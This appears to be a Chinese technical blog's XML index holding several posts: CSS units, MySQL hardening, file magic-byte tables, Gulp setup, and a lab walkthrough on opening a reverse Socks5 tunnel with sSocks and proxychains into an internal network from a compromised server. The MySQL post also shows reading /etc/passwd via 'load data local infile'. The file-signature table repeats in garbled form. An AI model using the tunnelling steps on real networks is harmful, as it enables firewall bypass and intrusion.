    <content type="text"><![CDATA[众所周知 CSS 技术我们虽然很熟悉, 在使用的过程却很容易被困住, 这让我们在新问题出现的时候变得很不利。 所以本文将介绍 CSS 中会用到的几个度量单位rem首先介绍下和我们熟悉的很相似的货。 em 被定义为相对于当前对象内文本的字体大小。 炒个栗子, 如果你给 body 小哥设置了 font-size 字体大小, 那么 body 小哥的任何子元素的 1 em 就是等于 body 设置的 font-size 。&lt;body&gt; &lt;div class=&quot;test&quot;&gt;Test&lt;/div&gt; &lt;/body&gt; body { font-size: 14px; } div { font-size: 1.2em;/* calculated at 14px * 1.2, or 16.8px */ } 这里 div 这娃的字体大小是 1.2em。 解释来说, 就是他从 body 爹爹那里继承的字体大小（这里是 14px）的 1.2 倍, 结果就是 16.8px。但是, 如果你用 em 一层一层级联得定义嵌套元素的字体大小又会花生什么事情呢？ 在下面这一小段代码里我们应用了和上面一样一样的 CSS, 每一个 div 都从它上一级父元素继承了字体大小, 并且逐渐得增加。&lt;body&gt; &lt;div&gt; Test &lt;!-- 14 * 1.2 = 16.8px --&gt; &lt;div&gt; Test &lt;!-- 16.8 * 1.2 = 20.16px --&gt; &lt;div&gt; Test &lt;!-- 20.16 * 1.2 = 24.192px --&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; 虽然在某些地方这正是我们想要的, 但是通常情况下我们还是希望就依赖单一的相对度量单位就好。 这时候嘛, 我们就可以使用 rem 了。 ‘r’ 是 &#39;root 的缩写, 意思就是 1rem 等于根元素的字体大小;大部分情况下, 根元素就是 &lt;html&gt; 元素了。html { font-size: 14px; } div { font-size: 1.2rem; } 这样在上面的那三个嵌套的 div 娃们的字体大小都是 1.2*14px = 16.8px 了。适用于网格布局Rems 不仅仅只是在设置字体大小上很方便。 再炒个栗子, 你可以用基于 html 根元素字体大小的 rem 作为整个网格布局或者 UI 库的大小单位, 然后在其他特定的地方用 em 单位。 这样将会给你带来更多的字体大小和伸缩的可控性,.container { width: 70rem;// 70 * 14px = 980px } 概念上来说, 这个方法的思想就是让你的界面根据你的内容进行缩放。 但是, 这样做并不是对所有的情况都有意义。vh and vw响应式 Web 设计 离不开百分比。 但是, CSS 百分比并不是所有的问题的最佳解决方案。 CSS 的宽度是相对于包含它的最近的父元素的宽度的。 但是如果你就想用视口（ viewpoint ）的宽度或者高度, 而不是父元素的, 那该肿么办？ 这就是 vh 和 vw 单位为我们提供的。1 vh 等于 1/100 的视口高度。 栗子： 浏览器高度 900px , 1 vh = 900px/100 = 9 px 。 同理, 如果视口宽度为 750, 1 vw = 750px/100 = 7.5 px 。可以想象到的, 他们有很多很多的用途。 比如, 我们用很简单的方法只用一行 CSS 代码就实现同屏幕等高的框。.slide { height: 100vh; } 假设你要来一个和屏幕同宽的标题, 你只要设置这个标题的 font-size 的单位为 vm , 那标题的字体大小就会自动根据浏览器的宽度进行缩放, 以达到字体和 viewport 大小同步的效果, 有木有？ ！vmin and vmaxvh 和 vm 依据于视口的高度和宽度, 相对的, vmin 和 vmax 则关于视口高度和宽度两者的最小或者最大值。 比如, 浏览器的宽度设置为 1100px, 高度设置为 700px, 1vmin = 1px , 1vmax = 11px 。 如果宽度设置为 800px, 高度设置为 1080px, 1vmin 就等于 8px, 1vmax 则为 10.8px。那么问题来了, 我们应该在什么场景下使用这两个单位呢？假设有一个元素, 你需要让它始终在屏幕上可见。 只要对其高度和宽度使用 vmin 单位, 并赋予其低于 100 的值就可以做到了。 再来个栗子, 可以这样定义一个至少有两个边触摸到屏幕的方形：.box { height: 100vmin; width: 100vmin; } 如果你要让这个方形框框始终铺满整个视口的可见区域（四边始终触摸到屏幕的四边）.box { height: 100vmax; width: 100vmax; } 结合使用这些单位可以为我们提供一个新颖有意思的方式来灵活地利用我们视口的大小。ex and chex 和 ch 单位, 类似于 em 和 rem , 依赖于当前的字体和字体大小。 但是, 不同的是, 这两货是基于字体的度量单位, 依赖于设定的字体。ch 单位通常被定义为数字 0 的宽度。 你可以在 Eric Meyers 的博客里找到关于它的一些有意思的讨论, 例如将一个等宽字体的字母”N”的宽度设置为 40ch , 那么在另一种类型的字体里它却可以包含 40 个字母。 这个单位的传统用途主要是盲文的排版, 但是除此之外, 肯定还有可以应用他的地方。ex 定义为当前字体的小写 x 字母的高度或者 1/2 的 1em 。 很多时候, 它是字体的中间标志。这些单位有很多用途, 大部分用于版式的微调。 比方说, sup 元素（上角文字标）, 可以通过 position:relative;bottom: 1ex; 实现 。 类似的方法, 你可以实现一个下角文字标。 浏览器默认的方式是利用上标和下标特定垂直对齐规则, 但是如果你想更细粒度更精确得控制, 你可以像下面这样做：sup { position: relative; bottom: 1ex; } sub { position: relative; bottom: -1ex; }]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Socks 代理反弹突破内网]]></title>
    <url>%2Farchives%2Fca37b044.html</url>
    <content type="text"><![CDATA[对于渗透测试者来说,如何绕过防火墙的阻挡在内网展开渗透测试成为需解决的问题,本文介绍了在夺取映射到外网的内网服务器权限后,如何利用 Socks 代理反弹获得内网访问权限环境介绍机子系统IP攻击机kali Liunx192.168.199.130 (外网)目标主机ubuntu-server192.168.199.131 (外网)；192.168.235.143 (内网)内网主机Metasploitable2-Liunx192.168.235.142 (内网)工具介绍sSockssSocks 是一个 socks 代理工具套装,可用来开启 socks 代理服务,支持 socks5 验证,支持 IPV6 和 UDP,并提供反向 socks 代理服务,即将远程计算机作为 socks 代理服务端,反弹回本地,极大方便内网的渗透测试下载sSocks 更新地址这里下载的版本为 0.0.14wget https://nchc.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz 解压并编译tar -xzvf ssocks-0.0.14.tar.gz cd ssocks-0.0.14 ./configure &amp;&amp; make 注意：编译的时候要先确定机子上有 gcc 环境,没有的请自行安装功能编译完成,进入 sr c 目录,会发现有 nsocks、ssocksd、ssocks、rcsocks,其功能说明介绍如下：nsocks 类似通过 Socks5 代理后的 netcat,可用来测试 socks serverssocksd 用来开启 Socks5 代理服务ssocks 本地启用 Socks5 服务,并反弹到另一 IP 地址rcsocks 接收反弹过来的 Socks5 服务,并转向另一端口攻击步骤现假设已获得 ubuntu-server 权限,也将 ssocks 这软件上传至该服务器（包含解压和编译）执行本地监听机子：kali Liunx；IP: 192.168.199.130cd ssocks-0.0.14/src ./rcsocks -l 1088 -p 1080 -vv 等待远程 Socks5 服务器访问本地 1080 端口,创建端口 1080 与本地端口 1088 的连接通道开启 Socks5 代理服务,反弹机子：ubuntu-server；IP: 192.168.199.131cd ssocks-0.0.14/src ./rssocks -vv -s 192.168.199.130:1080 启用 Socks5 服务,反弹到 192.168.199.130（即 kali Liunx） 的端口 1080 上此时在渗透测试端 192.168.199.130（即 kali Liunx） 可看到通道连接成功利用 proxychains 进行 Socks5 代理机子：kali Liunx；IP: 192.168.199.130proxychains 介绍通过前面的步骤,Socks5 代理已创建完成了。由于在渗透测试过程中,需要使用不同的工具程序,而在各程序中分别配置 Socks5 代理信息较为繁琐,而部分程序并不支持配置 Socks5 代理。为了简化这些操作,我们可以采用 proxychains。proxychains 是一个代理客户端软件,可以支持几乎所有程序的代理,如 ssh,telnet,ftp 等。利用 proxychains,程序能在代理的环境下被加载运行,而本身不需要具备代理功能。proxychains 下载需要 git 环境,在 kali Liunx 使用 proxychainsgit clone https://github.com/haad/proxychains.git 编译和安装cd proxychains ./configure make &amp;&amp; make install 修改配置文件使用前需要对 proxychains 进行简单配置,打开配置文件 /etc/proxychains.conf在 [ProxyList] 处添加socks5 127.0.0.1 1088 配置成功后若要启动程序,仅需要在启动程序命令前加上 proxychains启用浏览器 firefox机子：kali Liunx；IP: 192.168.199.130proxychains firefox 访问内网机子机子：kali Liunx；IP: 192.168.235.143注意：现在已经可以直接访问内网主机了,IP：192.168.235.142随便点个链接,然后再看一眼 ubuntu-server 中的日志,成功访问到内网中的页面后记由于系统管理员的疏忽或者业务需求所致,防火墙一般仅对由外向内发起的数据连接进行严格判断、过滤、甚至阻断而忽略由内往外的连接。因此,在此种情况下,通过攻陷映射到公网的端口服务,利用反弹便可获取内网访问权限,给内网安全带来极大的威胁。在信息安全建设与运维过程中,不仅要加强映射到公网的服务安全,也要重视由内到外连接的安全威胁 � 维过程中,不仅要加强映射到公网的服务安全,也要重视由内到外连接的安全威胁]]></content>
      <categories>
        <category>networking</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Network</tag>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的文件头和文件尾]]></title>
    <url>%2Farchives%2Ffb2bd835.html</url>
    <content type="text"><![CDATA[文件头是位于文件开头的一段承担一定任务的数据,一般都在开头的部分。而文件尾对应的就在 文件的结束部分,本篇将介绍常见的文件头和文件尾的十六进制数,这些文件的文件头和文件尾几乎多是一样的从 Ultraedit 提取的文件头信息文件类型文件头文件尾JPEG (jpg)FF D8 FFFF D9PNG (png)89 50 4E 47AE 42 60 82GIF (gif)47 49 46 3800 3BTIFF (tif)49 49 2A 00Windows Bitmap (bmp)42 4DZIP Archive (zip)50 4B 03 0450 4BRAR Archive (rar)52 61 72 2107 00CAD (dwg)41 43 31 30Adobe Photoshop (psd)38 42 50 53Rich Text Format (rtf)7B 5C 72 74 66XML (xml)3C 3F 78 6D 6CHTML (html)3C 68 74 6D 6C3C 2F 68 74 6D 6C 3EEmail thorough only (eml)44 65 6C 69 76 65 72 79 2D 64 61 74 65 3AOutlook Express (dbx)CF AD 12 FE C5 FD 74 6FOutlook (pst)21 42 44 4EMS Word/Excel (xls or doc)D0 CF 11 E0MS Access (mdb)53 74 61 6E 64 61 72 64 20 4AWordPerfect (wpd)FF 57 50 43Postscript (eps or ps)25 21 50 53 2D 41 64 6F 62 65Adobe Acrobat (pdf)25 50 44 46 2D 31 2EQuicken (qdf)AC 9E BD 8FWindows Password (pwl)AC 9E BD 8FWave (wav)57 41 56 45AVI (avi)41 56 49 20AVI (avi)41 56 49 20Real Audio (ram)2E 72 61 FDReal Media (rm)2E 52 4D 46MPEG (mpg)00 00 01 BAMPEG (mpg)00 00 01 B3Quicktime (mov)6D 6F 6F 76Windows Media (asf)30 26 B2 75 8E 66 CF 11MIDI (mid)4D 54 68 64从 winhex 提取的文件头信息文件文件后缀文件头JPEGjpg;jpeg0xFFD8FFPNGpng0x89504E470D0A1A0AGIFgifGIF8TIFFtif;tiff0x49492A00Bit mapbmpBMAOL ARTart0x4A47040E000000PC Paintbrushpcx0x0A050108Graphics Metafilewmf0xD7CDC69AEnhanced Metafileemf0x0100000058000000Corel DrawcdrCDRCADdwg0x41433130Adobe Photoshoppsd8BPSRich Text FormatrtfrtfXMLxmlHTMLhtml;htm;phptypeEmailemlDelivery-date:Outlook Expressdbx0xCFAD12FEMS Office/OLE2doc;xls;dot;ppt;db0xD0CF11E0A1B11AE1MS Accessmdb;mda;mde;mdtStandard JWordPerfectwpd0xFF575043OpenOffice WritersxwwriterOpenOffice CalcsxccalcWordPerfectwpd0xFF575043OpenOffice WritersxwwriterOpenOffice CalcsxccalcOpenOffice MathsxmmathWindows Passwordpwl0xE3828596ZIP Archivezip;jar0x504B0304ZIP Archive (outdated)zip0x504B3030RAR ArchiverarRar!GZ Archivegz;tgz0x1F8B08BZIP Archivebz2BZhARJ Archivearj0x60EA7－ZIP Archive7z7z 集’WavewavWAVEAVIaviAVIReal Audioram;ra.ra?0Real Mediarm.RMFMPEGmpg;mpeg0x000001BAMPEGmpg;mpeg0x000001B3F575043OpenOffice WritersxwwriterOpenOffice CalcsxccalcOpenOffice MathsxmmathWindows Passwordpwl0xE3828596ZIP Archivezip;jar0x504B0304ZIP Archive (outdated)zip0x504B3030RAR ArchiverarRar!GZ Archivegz;tgz0x1F8B08BZIP Archivebz2BZhARJ Archivearj0x60EA7－ZIP Archive7z7z 集’WavewavWAVEAVIaviAVIReal Audioram;ra.ra?0Real Mediarm.RMFMPEGmpg;mpeg0x000001BAMPEGmpg;mpeg0x000001B3F575043OpenOffice WritersxwwriterOpenOffice CalcsxccalcOpenOffice MathsxmmathWindows Passwordpwl0xE3828596ZIP Archivezip;jar0x504B0304ZIP Archive (outdated)zip0x504B3030RAR ArchiverarRar!GZ Archivegz;tgz0x1F8B08BZIP Archivebz2BZhARJ Archivearj0x60EA7－ZIP Archive7z7z 集’WavewavWAVEAVIaviAVIReal Audioram;ra.ra?0Real Mediarm.RMFMPEGmpg;mpeg0x000001BAMPEGmpg;mpeg0x000001B3]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL 数据库安全加固]]></title>
    <url>%2Farchives%2F75edbf20.html</url>
    <content type="text"><![CDATA[数据库作为数据管理的平台,它的安全性首先由系统内部和网络安全两部分来决定的。对于系统管理员来说,首先要保证系统本身的安全,在安装 MySQL 数据时,需要对基础环境进行较好的配置。本篇笔记将记录在 RedHat Liunx 系统下 MySQL 数据库的安全加固方法修改 root 用户口令缺省安装的 MySQL 的 root 用户是空密码的,为了安全起见,必须修改为强密码,所谓的强密码,至少 8 位,由字母、数字和符号组成的不规律密码。使用 MySQL 自带的命令 mysqladmin 修改 root 密码,同时也可以登陆数据库,修改数据库 mysql 下的 user 表的字段内容使用 mysqladmin 命令修改密码,For Example:mysqladmin -u root password &quot;upassword&quot; 使用 SQL 语句修改Connection Example:mysql -h 127.0.0.1 -u root -p 输入之前设置的密码 upassword,连接数据库修改密码,For Example:mysql&gt; use mysql; -- 切换当前的数据库 mysql&gt; update mysql.user set password=password(&#39;upassword&#39;) where user=&#39;root&#39;; mysql&gt; flush privileges; -- 强制刷新内存授权表,否则用的还是内存缓存中的口令。 修改完成之后可以执行 SQL 语句查询,For Example:mysql&gt; select * from mysql.user; 删除默认数据库和数据库用户一般情况下,MySQL 数据库安装在本地,并且也只需要本地的 php 脚本对 mysql 进行读取,所以很多用户不需要,尤其是默认安装的用户。MySQL 初始化后会自动生成空用户和 test 库,进行安装的测试,这会对数据库的安全构成威胁,有必要全部删除,最后的状态只保留单个 root 即可,当然以后根据需要增加用户和数据库。执行以下 SQL 语句,For Example:mysql&gt; show databases; -- 显示当前的所有数据库 mysql&gt; drop database test;-- 删除数据库 test mysql&gt; use mysql; mysql&gt; delete from db; -- 删除存放在数据库的表信息,因为还没有数据库信息 mysql&gt; delete from mysql.user where not (user=&#39;root&#39;); mysql&gt; delete from mysql.user where user=&#39;root&#39; and password=&#39;&#39;; mysql&gt; flush privileges; 改变默认 MySQL 管理员账号系统 MySQL 的管理员名称是 root,而一般情况下,数据库管理员都没进行修改,这一定程度上对系统用户穷举的恶意行为提供了便利,此时修改为复杂的用户名,请不要在设定为 admin 或者 administraror 的形式,因为它们也在易猜的用户字典中。mysql&gt; update mysql.user set user=&quot;newroot&quot; where user=&quot;root&quot;; mysql&gt; flush privileges; 关于密码的管理密码是数据库安全管理的一个很重要因素,不要将纯文本密码保存到数据库中。如果你的计算机有安全危险,入侵者可以获得所有的密码并使用它们。相反,应使用 MD5()、SHA1() 或单向哈希函数。也不要从词典中选择密码,有专门的程序可以破解它们,请选用至少八位,由字母、数字和符号组成的强密码。在存取密码时,使用 mysql 的内置函数 password（） 的 sql 语句,对密码进行加密后存储。例如以下方式在 users 表中加入新用户。mysql&gt; insert into users values (1,password(1234),&#39;test&#39;); 使用独立用户运行 MySQL绝对不要作为使用 root 用户运行 MySQL 服务器。这样做非常危险,因为任何具有 FILE 权限的用户能够用 root 创建文件(例如：~root/.bashrc)。mysqld 拒绝使用 root 运行,除非使用 –user=root 选项明显指定。应该用普通非特权用户运行 mysqld。要想用其它 Unix 用户启动 mysqld,,增加 user 选项指定 /etc/my.cnf 选项文件或服务器数据目录的 my.cnf 选项文件中的 [mysqld] 组的用户名。加固/etc/my.cnf 配置文件[mysqld] user=mysql 该命令使服务器用指定的用户来启动,无论你手动启动或通过 mysqld_safe 或 mysql.server 启动,都能确保使用 mysql 的身份。也可以在启动数据库是,加上 user 参数。/usr/bin/mysqld_safe --user=mysql 作为其它 linux 用户而不用 root 运行 mysqld,你不需要更改 user 表中的 root 用户名,因为 MySQL 账户的用户名与 linux 账户的用户名无关。确保 mysqld 运行时,只使用对数据库目录具有读或写权限的 linux 用户来运行。禁止远程连接数据库在命令行 netstat -ant 下看到,默认的 3306 端口是打开的,此时打开了 mysqld 的网络监听,允许用户远程通过帐号密码连接数本地据库,默认情况是允许远程连接数据的。为了禁止该功能,启动 skip-networking,不监听 sql 的任何 TCP/IP 的连接,切断远程访问的权利,保证安全性。假如需要远程管理数据库,可通过安装 PhpMyadmin 来实现。假如确实需要远程连接数据库,至少修改默认的监听端口,同时添加防火墙规则,只允许可信任的网络的 mysql 监听端口的数据通过。加固编辑 /etc/my.cnf,加入如下语句[mysqld] skip-networking 执行重启语句,For Example:service mysqld restart 限制连接用户的数量数据库的某用户多次远程连接,会导致性能的下降和影响其他用户的操作,有必要对其进行限制。可以通过限制单个账户允许的连接数量来实现,设置 my.cnf 文件的 mysqld 中的 max_user_connections 变量来完成。GRANT 语句也可以支持 资源控制选项来限制服务器对一个账户允许的使用范围。编辑 /etc/my.cnf,加入如下语句[mysqld] max_user_connections 2 用户目录权限限制默认的 MySQL 是安装在 /usr/share/mysql,而对应的数据库文件在 /var/lib/mysql 目录下,因此,必须保证该目录不能让未经授权的用户访问后把数据库打包拷贝走了,所以要限制对该目录的访问。确保 mysqld 运行时,只使用对数据库目录具有读或写权限的 linux 用户来运行。修改权限,For Example:chown -R root /usr/share/mysql chown -R mysql:mysql /var/lib/mysql 命令历史记录保护数据库相关的 shell 操作命令都会分别记录在 .bash_history,如果这些文件不慎被读取,会导致数据库密码和数据库结构等信息泄露,而登陆数据库后的操作将记录在 /etc/my.cnf 文件配置的文件中,如果使用 update 表信息来修改数据库用户密码的话,也会被读取密码,因此需要删除这两个文件,同时在进行登陆或备份数据库等与密码相关操作时,应该使用 -p 参数加入提示输入密码后,隐式输入密码,建议将以上文件置空。加固配置文件 /etc/my.cnf 中配置数据库操作日志存放路径,For Example:[mysqld_safe] log=~/.mysql_history 随意执行一些操作,For Example:查看 ~/.mysql_history 文件,可以看到数据库操作纪录（将会纪录所有成功或者失败的操作 SQL 语句）查看 ~/.bash_history 文件,可以看到有关于数据操作的 shell 命令删除操作命令,For Example:rm .bash_history .mysql_history ln -s /dev/null .bash_history ln -s /dev/null .mysql_history 禁止 MySQL 对本地文件存取在 mysql 中,提供对本地文件的读取,使用的是 load data local infile 命令,默认在 5.0 版本中,该选项是默认打开的,该操作令会利用 MySQL 把本地文件读到数据库中,然后用户就可以非法获取敏感信息了,假如你不需要读取本地文件,请务必关闭。测试存取测试：首先在测试数据库下建立 sqlfile.txt 文件,用逗号隔开各个字段在测试数据库,先新建一张表,建表的 SQL 语句如下,For Example:create table users ( userid int(11), username varchar(255), password int(11) ); 执行导入语句,For Example:mysql&gt; load data local infile &#39;sqlfile.txt&#39; into table test.users fields terminated by &#39;,&#39;; mysql&gt; select * from test.users; 成功的将本地数据插入数据中,此时应该禁止 MySQL 中用 load data local infile 命令。网络上流传的一些攻击方法中就有用它 load data local infile 的,同时它也是很多新发现的 SQL Injection 攻击利用的手段！黑客还能通过使用 load data local infile 装载 /etc/passwd 进一个数据库表,然后能用 SELECT 显示它,这个操作对服务器的安全来说,是致命的。可以在 /etc/my.cnf 中添加 local-infile=0,或者加参数 local-infile=0 启动 mysql。SQL 攻击黑客使用 load data local infile 获取 /etc/passwd 文件内容步骤接下来黑客只需执行 select * from test.passwd 就可以查询到数据了。加固编辑 /etc/my.cnf 文件,加入如下语句,For Example:[mysqld] local-infile=0 或者直接执行命令,For Example:mysql_safe --user=mysql --local-infile=0 再次执行 load data local infile 命令,导入 /etc/passwd 内容,发现命令出错mysql&gt; load data local infile &#39;/etc/passwd&#39; into table test.passwd fields terminated by &#39;:&#39;; MySQL 服务器权限控制MySQL 权限系统的主要功能是证实连接到一台给定主机的用户,并且赋予该用户在数据库上的 SELECT、INSERT、UPDATE 和 DELETE 等权限（详见 user 超级用户表）。它的附加的功能包括有匿名的用户并对于 MySQL 特定的功能例如 load data local infile 进行授权及管理操作的能力。FILE 权限允许用户在 MySQL 服务器具有写权限的目录下创建新文件,但不能覆盖已有文件在 user 表的 File_priv 设置 Y 或 N。,所以当你不需要对服务器文件读取时,请关闭该权限。加固需要将之前的加固配置项（local-infile=0）清掉mysql&gt; update mysql.user set file_priv=&#39;N&#39; where user=&#39;root&#39;; mysql&gt; flush privileges; 注意：刷新授权表之后,一定要重新登录再进行测试,否则还是会执行成功的当 file_priv=&#39;N&#39;,黑客进行以下语句的时候,就会出错mysql&gt; select * from test.passwd into outfile &#39;test.txt&#39; fields terminated by &#39;:&#39;; 当然还原配置之后,黑客就可以很愉快的获取数据库中内容使用 chroot 来控制 MySQL 的运行目录Chroot 是 linux 中的一种系统高级保护手段,它的建立会将其与主系统几乎完全隔离,也就是说,一旦遭到什么问题,也不会危及到正在运行的主系统。这是一个非常有效的办法,特别是在配置网络服务程序的时候。关闭对 Web 访问的支持如果不打算让 Web 访问使用 MySQL 数据库,没有提供诸如 PHP 这样的 Web 语言的时候,重新设置或编译你的 PHP,取消它们对 MySQL 的默认支持。假如服务器中使用 PHP 等 web 程序,试试用 Web 形式非法的请求,如果得到任何形式的 MySQL 错误,立即分析原因,及时修改 Web 程序,堵住漏洞,防止 MySQL 暴露在 web 面前。 对于 Web 的安全检查,在 MySQL 官方文档中这么建议,对于 web 应用,至少检查以下清单：试试用 Web 形式输入单引号和双引号(‘’’ 和 ‘”’)。如果得到任何形式的 MySQL 错误,立即分析原因。试试修改动态 URL,可以在其中添加 %22(‘”’)、%23(‘#’) 和 %27(‘’’)。试试在动态 URL 中修改数据类型,使用前面示例中的字符,包括数字和字符类型。你的应用程序应足够安全,可以防范此类修改和类似攻击。试试输入字符、空格和特殊符号,不要输入数值字段的数字。你的应用程序应在将它们传递到 MySQL 之前将它们删除或生成错误。将未经过检查的值传递给 MySQL 是很危险的！将数据传给 MySQL 之前先检查其大小。用管理账户之外的用户名将应用程序连接到数据库。不要给应用程序任何不需要的访问权限。数据库备份策略使用 mysqldump 可以把整个数据库装载到一个单独的文本文件中。这个文件包含有所有重建您的数据库所需要的 SQL 命令。mysqldump -u root -p mysql &gt; abc.sql mysqld 安全相关启动项下列 mysqld 选项影响安全：--allow-suspicious-udfs该选项控制是否可以载入主函数只有 xxx 符的用户定义函数。默认情况下,该选项被关闭,并且只能载入至少有辅助符的 UDF。这样可以防止从未包含合法 UDF 的共享对象文件载入函数。--local-infile[={0|1}]如果用 –local-infile=0 启动服务器,则客户端不能使用 LOCAL in LOAD DATA 语句。--old-passwords强制服务器为新密码生成短(pre-4.1)密码哈希。当服务器必须支持旧版本客户端程序时,为了保证兼容性这很有用。(OBSOLETE) --safe-show-database在以前版本的 MySQL 中,该选项使 SHOW DATABASES 语句只显示用户具有部分权限的数据库名。在 MySQL 5.1 中,该选项不再作为现在的 默认行为使用,有一个 SHOW DATABASES 权限可以用来控制每个账户对数据库名的访问。--safe-user-create如果启用,用户不能用 GRANT 语句创建新用户,除非用户有 mysql.user 表的 INSERT 权限。如果你想让用户具有授权权限来创建新用户,你应给用户授予下面的权限：mysql&gt; GRANT INSERT(user) ON mysql.user TO ‘user_name’@&#39;host_name’; 这样确保用户不能直接更改权限列,必须使用 GRANT 语句给其它用户授予该权限。--secure-auth不允许鉴定有旧(pre-4.1)密码的账户。--skip-grant-tables这个选项导致服务器根本不使用权限系统。这给每个人以完全访问所有的数据库的权力！（通过执行 mysqladmin flush-privileges 或 mysqladmin eload 命令,或执行 FLUSH PRIVILEGES 语句,你能告诉一个正在运行的服务器再次开始使用授权表。）--skip-name-resolve主机名不被解析。所有在授权表的 Host 的列值必须是 IP 号或 localhost。--skip-networking在网络上不允许 TCP/IP 连接。所有到 mysqld 的连接必须经由 Unix 套接字进行。--skip-show-database使用该选项,只允许有 SHOW DATABASES 权限的用户执行 SHOW DATABASES 语句,该语句显示所有数据库名。不使用该选项,允许所有用户执行 SHOW DATABASES,但只显示用户有 SHOW DATABASES 权限或部分数据库权限的数据库名。请注意全局权限指数据库的权限。]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Liunx</tag>
        <tag>Service</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Gulp 使用指南]]></title>
    <url>%2Farchives%2Fe59c5b19.html</url>
    <content type="text"><![CDATA[本文主要介绍如何使用 Gulp.js,来帮助你构建一个自动化的前端开发流程。总结并归类自身使用中所遇到的方法、问题,便于新人上手和理解,同时也作为一份 Gulp 参考文档来使用,让你对 Gulp 有个更深入的了解Gulp 是什么Gulp 是基于 Node.js 的一个构建工具（自动任务运行器）,开发者可以使用它构建自动化工作流程（前端集成开发环境）。一些常见、重复的任务,例如：网页自动刷新、CSS 预处理、代码检测、压缩图片、等等,只需用简单的命令就能全部完成。使用它,可以简化工作,让你把重点放在功能开发上；同时减少人为失误,提高开发效率和项目质量,让专注更为专注。如果你之前接触过 Grunt,那上手 Gulp 就会觉得非常容易理解。为什么使用 Gulp 而不使用 Grunt构建前端自动化的工具有很多,如：Grunt, Brunch, Broccoli 等,而目前过内最流行的属于 Grunt,之前我也在用使用,那为什么选择 Gulp 来代替 Grunt？简单的总结一下,有三点：简洁：Gulp 侧重 “代码优于配置”(code over configuration)。最直观的感受,更为简单和清晰,不需要像 Grunt 一样写一堆庞大的配置文件。高效：Gulp 基于 Node Streams（流）来构建任务,避免磁盘反复 I/O（读取/写入）。每个任务都是单独执行（坚持做一件事并且做好它）,这使得它速度更快、更为纯粹。易学：Gulp 核心 API 只有 4 个。简洁的 API 易于上手,学习过程比较平滑。Gulp 核心 APIGulp 的核心 API 只有 4 个：src、dest、task、watchgulp.src(globs[, options]) =&gt; 指明源文件路径。globs：路径模式匹配;options：可选参数；gulp.dest(path[, options]) =&gt; 指明处理后的文件输出路径。path：路径（一个任务可以有多个输出路径）；options：可选参数；gulp.task(name[, deps], fn) =&gt; 注册任务。name：任务名称（通过 gulp name 来执行这个任务）;deps：可选的数组,在本任务运行中所需要所依赖的其他任务（当前任务在依赖任务执行完毕后才会执行）;fn：任务函数（function 方法）；gulp.watch(glob [, opts], tasks) =&gt; 监视文件的变化并运行相应的任务。glob：路径模式匹配;opts：可以选配置对象;taks：执行的任务；API 帮助文档安装 Gulp安装 Gulp 之前要确定系统中安装了 Node.js,有了之后只需创建一个工作目录,以下操作均在工作目录下执行。全局安装深入设置任务之前,需先安装 gulp：npm install gulp -g 这会将 gulp 安装到全域环境下,让你可以存取 gulp 的 CLI。本地安装接着,需要在本地的工在目录进行安装。切换至你的工作目录,执行以下命令（当然执行之前要先确定该目录下有 package.json 文件,如果没有可以通过 npm init 进行创建）npm install gulp --save-dev 上述指令将 gulp 安装到本地的工作目录,并纪录于 package.json 中的 devDependencies 选项内。安装 Gulp 插件推荐插件静态服务器 (gulp-webserver)网页自动刷新 ([gulp-livereload][https://github.com/vohof/gulp-livereload])编译 Sass (gulp-ruby-sass)Autoprefixer (gulp-autoprefixer)缩小化(minify) CSS (gulp-minify-css)JSHint (gulp-jshint)拼接 (gulp-concat)丑化(Uglify) (gulp-uglify)图片压缩 (gulp-imagemin)即时重整(LiveReload) (gulp-livereload)清理档案 (gulp-clean)图片快取,只有更改过得图片会进行压缩 (gulp-cache)更动通知 (gulp-notify)通过 npm 进行安装Install Format:npm install [Module_Name] --save-dev Gulp 任务配置创建 gulpfile.js 文件在项目根目录中,创建 gulpfile.js 文件,用来配置和定义任务（task）。touch gulpfile.js 我的安装插件npm install gulp --save-dev # 基础库 npm install gulp-livereload --save-dev # 网页自动刷新 npm install gulp-webserver --save-dev # 本地服务器 npm install gulp-notify --save-dev # 更新 我的 gulpfile.js 配置打开 gulpfile.js 文件,填写相关配置。// 引入 gulp var gulp = require(&quot;gulp&quot;);// 基础库 // 引入 gulp 插件 var livereload = require(&quot;gulp-livereload&quot;);// 网页自动刷新（服务器控制客户端同步刷新） var webserver = require(&quot;gulp-webserver&quot;);// 本地服务器 // 注册任务 gulp.task(&quot;webserver&quot;, function() { gulp .src(&quot;./&quot;) // 服务器目录（./ 代表根目录） .pipe( webserver({ // 运行 gulp-webserver livereload: true, // 启用 LiveReload open: true // 服务器启动时自动打开网页 }) ); }); // 监听任务 gulp.task(&quot;watch&quot;, function() { gulp.watch(&quot;*.html&quot;, [&quot;html&quot;]);// 监听根目录下所有 .html 文件 }); // 默认任务 gulp.task(&quot;default&quot;, [&quot;webserver&quot;, &quot;watch&quot;]);]]></content>
      <categories>
        <category>manual</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript 中的 DOM 事件]]></title>
    <url>%2Farchives%2Ffe9a6fe9.html</url>
